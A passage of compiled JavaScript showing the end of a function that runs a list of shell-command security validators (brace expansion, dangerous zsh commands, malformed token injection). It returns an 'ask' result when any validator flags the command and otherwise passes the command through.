                        validateBraceExpansion,
                        validateZshDangerousCommands,
                        validateMalformedTokenInjection,
                    ];
                    deferredNonMisparsingResult = null;
                    for (_a = 0, validators_2 = validators; _a < validators_2.length; _a++) {
                        validator = validators_2[_a];
                        result = validator(context);
                        if (result.behavior === 'ask') {
                            if (nonMisparsingValidators.has(validator)) {
                                if (deferredNonMisparsingResult === null) {
                                    deferredNonMisparsingResult = result;
                                }
                                continue;
                            }
                            return [2 /*return*/, __assign(__assign({}, result), { isBashSecurityCheckForMisparsing: true })];
                        }
                    }
                    if (deferredNonMisparsingResult !== null) {
                        return [2 /*return*/, deferredNonMisparsingResult];
                    }
                    return [2 /*return*/, {
                            behavior: 'passthrough',
                            message: 'Command passed all security checks',
                        }];
            }
        });
    });
}
